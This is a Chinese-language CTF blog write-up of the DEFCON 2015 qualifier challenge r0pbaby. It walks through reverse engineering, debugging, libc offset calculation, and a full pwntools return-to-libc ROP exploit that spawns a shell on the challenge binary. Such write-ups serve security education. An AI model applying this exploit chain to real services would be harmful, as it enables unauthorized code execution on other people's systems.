---
title: DEFCON-2015-r0pbaby
date: 2017-09-16 15:03:11
categories: ctf
tags:
	- pwn
	- writeup
---
经典的简单64位ROP链构造题，为PWN选手找回自信。由于是入门的题目，所以一般看的都是初学者，我尽量写的比较详细。

<!--more-->

# DEFCONF-2015-r0pbaby
题源：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby

## 踩点
先看一下文件描述以及保护状态：
```shell
$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, stripped

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
```

可以看到这是64位可执行文件，开启了NX、PIE和FORTIFY。

执行一下，看看程序表现：
```shell
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007FBE204DD9B0
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007FBE1FD30390
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 5
1234
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 3
123
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
```

程序提供4个选项，执行效果来看，1可以获取libc的基址；2可以获取libc的某个函数地址，我们输入system发现获取了对应的地址；3可以用来copy数据到栈上，在两次输入时，当输入的字符超过指定的大小时，程序退出并打印Bad choice。

按照惯例，显然1和2就是leak info所用，3应该存在栈溢出，这里也有好的提示了大小应该是1024。

从卖相上来看，这题不做BROP可惜了。

## 屠龙宝刀IDA
既然给了二进制，那就丢到IDA reverse看一下。
```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rsi@1
  const char *v4; // rdi@1
  signed int v5; // eax@4
  unsigned __int64 v6; // r14@15
  int v7; // er13@17
  size_t v8; // r12@17
  int v9; // eax@18
  void *handle; // [sp+8h] [bp-448h]@1
  char nptr[1088]; // [sp+10h] [bp-440h]@2
  __int64 savedregs; // [sp+450h] [bp+0h]@22

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  v3 = (char *)1;
  v4 = "libc.so.6";
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          sub_BF7(v4, v3);
          if ( !sub_B9A((__int64)nptr, 1024LL) )
          {
            puts("Bad choice.");
            return 0LL;
          }
          v3 = 0LL;
          v5 = strtol(nptr, 0LL, 10);
          if ( v5 != 2 )
            break;
          __printf_chk(1LL, "Enter symbol: ");
          v3 = (char *)64;
          if ( sub_B9A((__int64)nptr, 64LL) )
          {
            dlsym(handle, nptr);
            v3 = "Symbol %s: 0x%016llX\n";
            v4 = (const char *)1;
            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
          }
          else
          {
            v4 = "Bad symbol.";
            puts("Bad symbol.");
          }
        }
        if ( v5 > 2 )
          break;
        if ( v5 != 1 )
          goto LABEL_24;
        v3 = "libc.so.6: 0x%016llX\n";
        v4 = (const char *)1;
        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
      }
      if ( v5 != 3 )
        break;
      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
      sub_B9A((__int64)nptr, 1024LL);
      v3 = 0LL;
      v6 = (signed int)strtol(nptr, 0LL, 10);
      if ( v6 - 1 > 0x3FF )
      {
        v4 = "Invalid amount.";
        puts("Invalid amount.");
      }
      else
      {
        if ( v6 )
        {
          v7 = 0;
          v8 = 0LL;
          while ( 1 )
          {
            v9 = _IO_getc(stdin);
            if ( v9 == -1 )
              break;
            nptr[v8] = v9;
            v8 = ++v7;
            if ( v6 <= v7 )
              goto LABEL_22;
          }
          v8 = v7 + 1;
        }
        else
        {
          v8 = 0LL;
        }
LABEL_22:
        v3 = nptr;
        v4 = (const char *)&savedregs;
        memcpy(&savedregs, nptr, v8);
      }
    }
    if ( v5 == 4 )
      break;
LABEL_24:
    v4 = "Bad choice.";
    puts("Bad choice.");
  }
  dlclose(handle);
  puts("Exiting.");
  return 0LL;
}
```

程序流程状态机虽然都写在main里，但比较简单，通过阅读代码，发现实际上这并不是栈溢出，而是程序本身就执行了`memcpy(&saveregs, nptr, v8);`。saveregs是IDA的关键字，保存的实际上是函数的栈帧指针RBP和返回地址。我们来看看上面在执行时，两次选择3菜单时发生了什么。

第一次选择3时，输入个数为5，此后输入了1234+enter，按照程序的逻辑，v6为5，而循环_IO_getc()时，直到从输入缓冲区拿到enter，才跳转到了LABEL_22，程序的RBP被覆盖了5个字节。此后继续循环，由于没有退出main函数所以暂时看不出影响。

第二次选择3时，输入个数为3，此后输入了123+enter，这一次v6为3，循环到'3'的时候，跳转到了LABEL_22，此时输入缓冲区还有个enter。这一次用123覆盖了RBP，而后继续循环进入了sub_B9A()，由于输入缓冲区遗留的enter，实际上也就是`\x0a`，程序break并返回0，然后输出了bad choice并退出，由于仅仅覆盖了RBP,ret addr还是正确的，所以程序没有报segmentation error。

为验证这一猜想，我们试试15个字符，即覆盖了ret addr：
```shell
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 15
123456789012345
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
Segmentation fault (core dumped)
```

同样的，我们也可以不利用输入缓冲区中的`\x0a`，使用程序本身的功能4：
```shell
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 15  
12345678901234
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 4
Exiting.
Segmentation fault (core dumped)
```

所以，我们的目的很清楚，无非就是覆盖ret addr到我们的shellcode。但目前面临一个问题：在哪里构造shellcode？我们可控的这部分栈肯定不行，因为NX enabled。

所以，这就需要ROP了，libc里实际上存在着system函数以及"/bin/sh"字符串，如果我们能够拿到system的地址以及"/bin/sh"字符串的地址，就可以为所欲为。通过覆盖ROP `pop rdi,ret;`的地址到ret addr将"/bin/sh"的地址放入rdi，再依次放置system地址覆盖ret返回的ret addr即可，此时布局如下：
```
pad bytes -> skip rbp 
ROP addr  -> pop rdi,ret
bin/sh addr -> this will pop to rdi
system addr -> ROP ret addr
```

> x64函数调用中，前6个参数依次放入rdi, rsi, rdx, rcx, r8, r9中超过的部分再放入栈中。

尽管ASLR的存在，libc的基址会变化，但是程序本身已经提供了leak info的菜单。不仅可以拿到libc的基址，也可以拿到任意函数的地址。而另一方面，我们可以通过search libc.so.6来找到"/bin/sh"相对libc基址的偏移，或者相对system的偏移，从而算出地址（相对偏移是不会改变的，ASLR只能改变基址）。

> ASLR可以通过这些手法来看：

![](/images/ctf/pwn/20170916_1.jpg)

## 动态调试
我们先通过本地调试，验证一下程序给的地址是否正确：
```shell
gdb-peda$ b _IO_getc
Breakpoint 1 at 0x9f0
gdb-peda$ r
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: [----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x7ffff7900290 (<__write_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7bcf780 --> 0x0 
RSI: 0x3ff 
RDI: 0x7ffff7bcd8e0 --> 0xfbad2088 
RBP: 0x0 
RSP: 0x7fffffffd938 --> 0x555555554bc8 (cmp    eax,0xffffffff)
RIP: 0x7ffff787f030 (<getc>:	push   rbx)
R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)
R9 : 0x2 
R10: 0x814 
R11: 0x7ffff787f030 (<getc>:	push   rbx)
R12: 0x7fffffffd980 --> 0x1 
R13: 0x7ffff7bce710 --> 0x7ffff7bcd8e0 --> 0xfbad2088 
R14: 0x3ff 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff787f020 <fseek+288>:	call   0x7ffff7829b30 <_Unwind_Resume>
   0x7ffff787f025:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x7ffff787f02f:	nop
=> 0x7ffff787f030 <getc>:	push   rbx
   0x7ffff787f031 <getc+1>:	mov    eax,DWORD PTR [rdi]
   0x7ffff787f033 <getc+3>:	mov    rbx,rdi
   0x7ffff787f036 <getc+6>:	and    eax,0x8000
   0x7ffff787f03b <getc+11>:	jne    0x7ffff787f093 <getc+99>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd938 --> 0x555555554bc8 (cmp    eax,0xffffffff)
0008| 0x7fffffffd940 --> 0x7fffffffd980 --> 0x1 
0016| 0x7fffffffd948 --> 0x7fffffffddc0 --> 0x555555554ec0 (push   r15)
0024| 0x7fffffffd950 --> 0x555555554a60 (xor    ebp,ebp)
0032| 0x7fffffffd958 --> 0x7fffffffdea0 --> 0x1 
0040| 0x7fffffffd960 --> 0x0 
0048| 0x7fffffffd968 --> 0x555555554cdc (test   rax,rax)
0056| 0x7fffffffd970 --> 0x7fffffffda04 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00007ffff787f030 in getc ()
   from /lib/x86_64-linux-gnu/libc.so.6
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7ffff784e390 <system>
gdb-peda$ info proc mappings
process 6594
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555556000     0x2000        0x0 /home/r00tk1t/ctf/write-ups-2015-master/defcon-qualifier-ctf-2015/babys-first/r0pbaby/r0pbaby
      0x555555755000     0x555555757000     0x2000     0x1000 /home/r00tk1t/ctf/write-ups-2015-master/defcon-qualifier-ctf-2015/babys-first/r0pbaby/r0pbaby
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7809000     0x7ffff79c9000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff79c9000     0x7ffff7bc9000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bc9000     0x7ffff7bcd000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7bcf000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcf000     0x7ffff7bd3000     0x4000        0x0 
      0x7ffff7bd3000     0x7ffff7bd6000     0x3000        0x0 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7ffff7bd6000     0x7ffff7dd5000   0x1ff000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7ffff7dd5000     0x7ffff7dd6000     0x1000     0x2000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7ffff7dd6000     0x7ffff7dd7000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7fdb000     0x7ffff7fde000     0x3000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ 
```

程序输出的是`libc.so.6: 0x00007FFFF7FF79B0`，这和我们看到的不太一致，所以这应该是一个烟雾弹的fake地址（我没有深究程序是如何计算的，但应该就是和IDA里看到的dlopen()有关，至于是何种原因libc地址不正确，就先不关心了）。

程序输出的system地址是`Symbol system: 0x00007FFFF784E390`，这个地址是正确的，和print system一致。那么实际上这里也就得出了system到libc的偏移为0x45390。

再寻找libc.so.6中"/bin/sh"的偏移：
```shell
$ strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 18cd17 /bin/sh
```

通过ROPgarget工具搜索gadget：
```shell
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
Gadgets information
============================================================
0x00000000000dbeb5 : pop qword ptr [rsi - 0x77000000] ; ret 0xd139
0x0000000000115065 : pop r10 ; ret
0x000000000002024f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fb : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b2 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e3 : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000006d125 : pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000206c2 : pop r12 ; pop r13 ; ret
0x00000000000b65d4 : pop r12 ; pop r14 ; ret
0x00000000000398c6 : pop r12 ; pop rbp ; ret
0x000000000001fb12 : pop r12 ; ret
0x0000000000020251 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fd : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b4 : pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e5 : pop r13 ; pop r14 ; ret
0x000000000006d127 : pop r13 ; pop rbp ; ret
0x00000000000206c4 : pop r13 ; ret
0x0000000000020253 : pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210ff : pop r14 ; pop r15 ; ret
0x00000000000cd6b6 : pop r14 ; pop rbp ; ret
0x00000000000202e7 : pop r14 ; ret
0x0000000000020255 : pop r15 ; pop rbp ; ret
0x0000000000021101 : pop r15 ; ret
0x000000000001f92e : pop rax ; pop rbx ; pop rbp ; ret
0x0000000000143571 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000033544 : pop rax ; ret
0x00000000000caabc : pop rax ; ret 0x2f
0x00000000000210fa : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000202e2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b65d3 : pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb11 : pop rbp ; pop r12 ; ret
0x000000000012cac6 : pop rbp ; pop r13 ; pop r14 ; ret
0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000cd6b5 : pop rbp ; pop r14 ; pop rbp ; ret
0x00000000000202e6 : pop rbp ; pop r14 ; ret
0x000000000006d128 : pop rbp ; pop rbp ; ret
0x0000000000048438 : pop rbp ; pop rbx ; ret
0x000000000001f930 : pop rbp ; ret
0x00000000000cd6b1 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret
0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b65d2 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret
0x000000000012cac5 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x000000000001f92f : pop rbx ; pop rbp ; ret
0x000000000002a69a : pop rbx ; ret
0x0000000000001b18 : pop rbx ; ret 0x2a63
0x0000000000185de0 : pop rbx ; ret 0x6f9
0x000000000013cbcf : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000101efb : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000000ea66a : pop rcx ; pop rbx ; ret
0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63
0x00000000000d20a3 : pop rcx ; ret
0x0000000000020256 : pop rdi ; pop rbp ; ret
0x0000000000021102 : pop rdi ; ret
0x0000000000067499 : pop rdi ; ret 0xffff
......
```
0x21102较为理想。实际上ROP构造随意折腾，只要达成目的即可。

所以，我们目前拿到的信息汇总：
1. 通过菜单2拿到system地址
2. system-0x45390为libc基址
3. libc+0x21102为garget `pop rdi,ret`地址
4. libc+0x18cd17为"/bin/sh"地址

## 编写exp
```python
from pwn import *

debug = 1
if debug == 1:
	io = process("./r0pbaby")
else:
	io = remote("127.0.0.1",10002)
io.recvuntil(": ")
io.send("2\n")
io.recv(1024)
io.send("system\n")
msg = io.recv(1024)
offset = msg.find(":")
offset2 = msg.find("\n")
base = msg[offset+2:offset2]
system = long(base,16)
print hex(system)
#system = 0x00007FFFF784E390
rdi_gadget_offset = 0x21102
bin_sh_offset = 0x18cd17
system_offset = 0x45390
libc_base = system - system_offset
print "[+] libc base: [%x]" % libc_base
rdi_gadget_addr = libc_base + rdi_gadget_offset
print "[+] RDI gadget addr: [%x]" % rdi_gadget_addr
bin_sh_addr = libc_base + bin_sh_offset
print "[+] \"/bin/sh\" addr[%x]" % bin_sh_addr
print "[+] system addr:[%x]" % system
payload = "A"*8
payload += p64(rdi_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system)


io.sendline("3")
io.recv(1024)
io.send("%d\n"%(len(payload)+1))
io.sendline(payload)
io.sendline("4")
io.interactive()
```

代码写得略丑，没有规范编码，但较容易理解。

![](/images/ctf/pwn/20170916_2.jpg)